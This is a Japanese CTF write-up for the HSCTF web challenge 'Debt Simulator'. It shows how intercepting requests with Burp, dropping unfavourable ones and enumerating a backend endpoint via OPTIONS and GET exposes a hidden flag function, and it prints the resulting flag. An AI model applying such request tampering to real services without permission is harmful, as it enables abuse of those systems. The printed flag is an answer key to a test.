# Debt Simulator

100pt (579 Solves)

```txt
https://debt-simulator.web.hsctf.com/

Author: Madeleine
```

## 概要

![Debt Simulator](../img/Debt_Simulator.png)

運試し的な感じ。ボタンを押すと、お金が貰える/お金を払う。  
$-1000に到達すると負け、$2000に到達すると勝ち。  
以下のjsコードを読めばわかると思うが、まぁ普通にやってたら勝てない

```js
const onClick = () => {
    const isGetCost = Math.random() > 0.4 ? true : false;
    const func = isGetCost ? 'getCost' : 'getPay';
    const requestOptions = {
      method: 'POST',
      body: 'function=' + func,
      headers: { 'Content-type': 'application/x-www-form-urlencoded' }
    }

    fetch("https://debt-simulator-login-backend.web.hsctf.com/yolo_0000000000001", requestOptions)
    .then(res => res.json())
    .then(data => {
      data = data.response;
      if (buttonText === "Play Again" || buttonText === "Start Game") {
        setButtonText("Next Round");
        setRunningTotal(0);
      }
      setMessage("You have " + (isGetCost ? "paid me " : "received ") + "$" + data + ".");
      setRunningTotal(runningTotal => isGetCost ? runningTotal - data : runningTotal + data);
    });
}
```

Burpで通信を見てみる。

```txt
> POST /yolo_0000000000001 HTTP/1.1
> Host: debt-simulator-login-backend.web.hsctf.com
    :
> function=getPay

---------------------------------------------------

< HTTP/1.1 200 OK
    :
< {"response":2}
```

お金が貰えるのは`getPay`、減るのは`getCost`になる。  
どちらのリクエストでもレスポンスは同じ形式で、数字だけ変わる。  
とりあえず勝利目指そうとしてBurpで`getCost`の通信を`getPay`に書き換えてみたが、  
上記のjsコードの通り計算自体は手元でされているので、書き換えたところでマイナスされる。

「`getCost`のリクエスト自体をなかったことにしてしまえばいいんじゃね？」と思い、  
BurpでDropしたら上手く消せた。`getPay`をSend、`getCost`をDropを繰り返してると  
`You won. You have more than $2000. Try your luck again?`と言われる。flagはない。

## 解

OPTIONでリクエストを送ってみると、GETができるらしい。

```txt
> OPTIONS /yolo_0000000000001 HTTP/1.1
> Host: debt-simulator-login-backend.web.hsctf.com
    :
---------------------------------------------------
< HTTP/1.1 200 OK
    :
< Allow: GET,POST,HEAD
```

GETリクエストを送る。

```txt
> GET /yolo_0000000000001 HTTP/1.1
> Host: debt-simulator-login-backend.web.hsctf.com
    :
---------------------------------------------------
< HTTP/1.1 200 OK
    :
< {
<   "functions":[
<       "getPay",
<       "getCost",
<       "getgetgetgetgetgetgetgetgetFlag"
<   ]
< }
```

今まで使ってた`getPay`と`getCost`の他に、  
`getgetgetgetgetgetgetgetgetFlag`なるものがあるらしい。
POSTしてみる。

```txt
> POST /yolo_0000000000001 HTTP/1.1
> Host: debt-simulator-login-backend.web.hsctf.com
    :
> function=getgetgetgetgetgetgetgetgetFlag
---------------------------------------------------
< HTTP/1.1 200 OK
    :
< {"response":"flag{y0u_f0uND_m3333333_123123123555554322221}"}
```

flagが手に入った。

```txt
flag{y0u_f0uND_m3333333_123123123555554322221}
```
